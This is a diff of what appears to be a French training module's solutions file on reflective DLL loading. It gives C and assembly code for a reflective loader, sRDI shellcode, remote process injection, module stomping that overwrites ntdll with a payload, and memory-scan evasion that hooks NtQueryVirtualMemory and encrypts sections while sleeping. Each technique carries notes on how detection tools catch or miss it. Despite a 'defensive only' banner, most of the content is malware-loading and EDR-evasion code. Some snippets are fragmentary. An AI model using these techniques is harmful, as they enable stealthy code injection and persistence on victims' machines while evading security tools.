@@ -1,156 +1,231 @@
-═══════════════════════════════════════════════════════════════════
-SOLUTIONS - Module 37 : Reflective Loading
-═══════════════════════════════════════════════════════════════════
+SOLUTIONS - MODULE 37 : REFLECTIVE LOADING
 
-SOLUTION 1 : PE Parser
-═══════════════════════════════════════════════════════════════════
+⚠️ AVERTISSEMENT : Techniques pour compréhension défensive uniquement.
 
-void parser_pe(const char *fichier) {
-    HANDLE hFile = CreateFile(fichier, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    DWORD size = GetFileSize(hFile, NULL);
-    BYTE *buffer = malloc(size);
-    ReadFile(hFile, buffer, size, &size, NULL);
-    CloseHandle(hFile);
+SOLUTION 1 : COMPLETE PE PARSER
 
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);
+IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buffer;
+if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;  // MZ check
 
-    printf("Machine: 0x%X\n", nt->FileHeader.Machine);
-    printf("Sections: %d\n", nt->FileHeader.NumberOfSections);
-    printf("EntryPoint: 0x%X\n", nt->OptionalHeader.AddressOfEntryPoint);
+IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(buffer + dos->e_lfanew);
+if (nt->Signature != IMAGE_NT_SIGNATURE) return;  // PE check
 
-    free(buffer);
+printf("Image Base: 0x%llX\n", nt->OptionalHeader.ImageBase);
+printf("Entry Point: 0x%X\n", nt->OptionalHeader.AddressOfEntryPoint);
+
+IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
+for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+    printf("Section: %.8s RVA=0x%X Size=0x%X Perms=0x%X\n",
+           section[i].Name, section[i].VirtualAddress,
+           section[i].SizeOfRawData, section[i].Characteristics);
 }
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 2 : Import Resolution
-═══════════════════════════════════════════════════════════════════
+Bypass : Static analysis only, runtime behavior undetected
 
-BOOL resoudre_imports(BYTE *base) {
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
 
-    DWORD importRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(base + importRVA);
+SOLUTION 2 : MANUAL IMPORT RESOLUTION
 
-    while (importDesc->Name) {
-        char *dllName = (char*)(base + importDesc->Name);
-        HMODULE hDll = LoadLibraryA(dllName);
+IMAGE_DATA_DIRECTORY* import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)(base + import_dir->VirtualAddress);
 
-        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + importDesc->FirstThunk);
-        PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(base + importDesc->OriginalFirstThunk);
+while (desc->Name) {
+    char* dll_name = (char*)(base + desc->Name);
+    HMODULE dll = LoadLibraryA(dll_name);
 
-        while (thunk->u1.AddressOfData) {
-            if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
-                PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)(base + origThunk->u1.AddressOfData);
-                FARPROC func = GetProcAddress(hDll, (char*)import->Name);
-                thunk->u1.Function = (ULONGLONG)func;
-            }
-            thunk++;
-            origThunk++;
+    IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(base + desc->OriginalFirstThunk);
+    IMAGE_THUNK_DATA* iat = (IMAGE_THUNK_DATA*)(base + desc->FirstThunk);
+
+    while (thunk->u1.AddressOfData) {
+        if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
+            // Ordinal import
+            WORD ordinal = IMAGE_ORDINAL(thunk->u1.Ordinal);
+            iat->u1.Function = (DWORD_PTR)GetProcAddress(dll, (LPCSTR)ordinal);
+        } else {
+            // Named import
+            IMAGE_IMPORT_BY_NAME* import = (IMAGE_IMPORT_BY_NAME*)(base + thunk->u1.AddressOfData);
+            iat->u1.Function = (DWORD_PTR)GetProcAddress(dll, import->Name);
         }
-        importDesc++;
+        thunk++;
+        iat++;
     }
-    return TRUE;
+    desc++;
 }
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 3 : Relocation
-═══════════════════════════════════════════════════════════════════
+Bypass : IAT hooking detection still finds resolved imports
 
-BOOL appliquer_relocations(BYTE *base, DWORD_PTR delta) {
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
 
-    DWORD relocRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(base + relocRVA);
+SOLUTION 3 : BASE RELOCATION ENGINE
 
-    while (reloc->VirtualAddress) {
-        WORD *relocData = (WORD*)(reloc + 1);
-        int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+IMAGE_DATA_DIRECTORY* reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(base + reloc_dir->VirtualAddress);
 
-        for (int i = 0; i < count; i++) {
-            int type = relocData[i] >> 12;
-            int offset = relocData[i] & 0xFFF;
+DWORD_PTR delta = (DWORD_PTR)base - nt->OptionalHeader.ImageBase;
 
-            if (type == IMAGE_REL_BASED_DIR64) {
-                ULONGLONG *addr = (ULONGLONG*)(base + reloc->VirtualAddress + offset);
-                *addr += delta;
-            }
+while (reloc->VirtualAddress) {
+    WORD* entry = (WORD*)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
+    DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+
+    for (DWORD i = 0; i < count; i++) {
+        WORD type = entry[i] >> 12;
+        WORD offset = entry[i] & 0xFFF;
+        LPBYTE addr = (LPBYTE)(base + reloc->VirtualAddress + offset);
+
+        if (type == IMAGE_REL_BASED_DIR64) {
+            *(DWORD_PTR*)addr += delta;
+        } else if (type == IMAGE_REL_BASED_HIGHLOW) {
+            *(DWORD*)addr += (DWORD)delta;
         }
-
-        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
-    }
-    return TRUE;
-}
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 4 : Reflective Loader (simplifié)
-═══════════════════════════════════════════════════════════════════
-
-HMODULE charger_dll_memoire(BYTE *dllBuffer, size_t taille) {
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBuffer + dos->e_lfanew);
-
-    BYTE *base = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
-                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    memcpy(base, dllBuffer, nt->OptionalHeader.SizeOfHeaders);
-
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        memcpy(base + section[i].VirtualAddress,
-               dllBuffer + section[i].PointerToRawData,
-               section[i].SizeOfRawData);
     }
 
-    resoudre_imports(base);
-
-    DWORD_PTR delta = (DWORD_PTR)base - nt->OptionalHeader.ImageBase;
-    if (delta) appliquer_relocations(base, delta);
-
-    DWORD old;
-    VirtualProtect(base, nt->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &old);
-
-    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
-    DllMain_t DllMain = (DllMain_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
-    DllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
-
-    return (HMODULE)base;
+    reloc = (IMAGE_BASE_RELOCATION*)((LPBYTE)reloc + reloc->SizeOfBlock);
 }
 
-═══════════════════════════════════════════════════════════════════
-AUTRES SOLUTIONS (concepts)
-═══════════════════════════════════════════════════════════════════
+Bypass : Relocations expected, no red flags
 
-SOLUTION 5 : PIC Generator
-- Utiliser RIP-relative addressing
-- Éviter adresses absolues
-- Tester avec memcpy à différentes adresses
 
-SOLUTION 6 : Reflective Injector
-- OpenProcess(PROCESS_ALL_ACCESS, pid)
-- VirtualAllocEx
-- WriteProcessMemory (DLL + loader)
-- CreateRemoteThread
+SOLUTION 4 : FULL REFLECTIVE DLL LOADER
 
-SOLUTION 7 : TLS Callbacks
-- __declspec(allocate(".CRT$XLB"))
-- PIMAGE_TLS_CALLBACK array
-- Exécuté avant DllMain
+LPVOID base = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
+                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-SOLUTION 8 : Anti-Detection
-- Masquer IAT avec obfuscation
-- Supprimer MZ/PE signature après load
-- Module stomping sur module légitime
+// Copy headers
+memcpy(base, buffer, nt->OptionalHeader.SizeOfHeaders);
 
-═══════════════════════════════════════════════════════════════════
-RESSOURCES
-═══════════════════════════════════════════════════════════════════
+// Copy sections
+IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
+for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+    memcpy((LPBYTE)base + section[i].VirtualAddress,
+           buffer + section[i].PointerToRawData, section[i].SizeOfRawData);
+}
 
-- Reflective DLL Injection (Stephen Fewer)
-- PE Format Spec (Microsoft)
-- Windows Internals
-- Metasploit ReflectiveDLLInjection module
+// Resolve imports (see SOLUTION 2)
+resolve_imports(base, nt);
 
-═══════════════════════════════════════════════════════════════════
+// Relocations (see SOLUTION 3)
+apply_relocations(base, nt, delta);
+
+// Fix permissions
+for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+    DWORD protect = PAGE_READONLY;
+    if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
+    if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;
+    VirtualProtect((LPBYTE)base + section[i].VirtualAddress,
+                   section[i].SizeOfRawData, protect, &old);
+}
+
+// Execute DllMain
+typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+DllMain_t entry = (DllMain_t)((LPBYTE)base + nt->OptionalHeader.AddressOfEntryPoint);
+entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
+
+Bypass : Memory scan détecte PE headers, EDR voit pattern
+
+
+SOLUTION 5 : SRDI (SHELLCODE REFLECTIVE DLL)
+
+Bootstrap shellcode (ASM x64) :
+; Find kernel32.dll base via PEB
+mov rax, [gs:0x60]      ; PEB
+mov rax, [rax+0x18]     ; Ldr
+mov rax, [rax+0x20]     ; InMemoryOrderModuleList
+mov rax, [rax]          ; First entry (ntdll)
+mov rax, [rax]          ; Second entry (kernel32)
+mov rax, [rax+0x20]     ; DllBase
+
+; Find LoadLibraryA/GetProcAddress by parsing exports
+; ... (export parsing code)
+
+; Relocate self
+lea rbx, [rip]          ; Current RIP
+sub rbx, offset_to_start
+; Apply relocations with rbx as base
+
+; Load DLL from embedded buffer
+call LoadLibraryA
+
+Tools : sRDI-x64.py converts any DLL to shellcode
+
+Bypass : No PE on disk, pure shellcode, hard to detect
+
+
+SOLUTION 6 : REMOTE PROCESS INJECTION
+
+HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
+
+SIZE_T alloc_size = dll_size + loader_size;
+LPVOID remote_mem = VirtualAllocEx(hProc, NULL, alloc_size,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+// Write DLL buffer
+WriteProcessMemory(hProc, remote_mem, dll_buffer, dll_size, NULL);
+
+// Write loader stub
+WriteProcessMemory(hProc, (LPBYTE)remote_mem + dll_size,
+                   loader_stub, loader_size, NULL);
+
+// Execute loader
+HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
+                                    (LPTHREAD_START_ROUTINE)((LPBYTE)remote_mem + dll_size),
+                                    remote_mem, 0, NULL);
+WaitForSingleObject(hThread, INFINITE);
+
+CloseHandle(hThread);
+CloseHandle(hProc);
+
+Bypass : EDR détecte ce pattern classique, Sysmon Event 8
+
+
+SOLUTION 7 : MODULE STOMPING
+
+// Find loaded ntdll.dll
+HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((LPBYTE)ntdll + dos->e_lfanew);
+
+// Find .text section
+IMAGE_SECTION_HEADER* text = find_section(nt, ".text");
+
+// Make writable
+DWORD old;
+VirtualProtect((LPBYTE)ntdll + text->VirtualAddress,
+               text->SizeOfRawData, PAGE_EXECUTE_READWRITE, &old);
+
+// Overwrite with malicious code
+memcpy((LPBYTE)ntdll + text->VirtualAddress, payload, payload_size);
+
+// Execute at known offset in ntdll (now malicious)
+((void(*)())((LPBYTE)ntdll + 0x1234))();
+
+Bypass : Looks like legitimate ntdll.dll, hard to detect
+
+
+SOLUTION 8 : ANTI-MEMORY-SCANNING
+
+// Erase PE headers after loading
+memset(base, 0, nt->OptionalHeader.SizeOfHeaders);
+
+// Encrypt .text when sleeping
+encrypt_section(base + text_rva, text_size, key);
+Sleep(sleep_time);
+decrypt_section(base + text_rva, text_size, key);
+
+// Hook NtQueryVirtualMemory
+hook_function("ntdll!NtQueryVirtualMemory", fake_query);
+
+NTSTATUS WINAPI fake_query(...) {
+    NTSTATUS ret = original_query(...);
+    // Modify returned info to hide our pages
+    if (info->BaseAddress == our_base) {
+        info->Type = MEM_IMAGE;  // Pretend file-backed
+    }
+    return ret;
+}
+
+Bypass : Advanced scanners reconstruct PE, entropy analysis finds encrypted sections
+
+
+RÉFÉRENCES :
+- Stephen Fewer "Reflective DLL Injection" whitepaper
+- sRDI (Monoxgas) - Shellcode Reflective DLL Injection
+- PE format specification (Microsoft)
+- "Peering Inside the PE" (Matt Pietrek)
+- Cobalt Strike sleep mask implementation
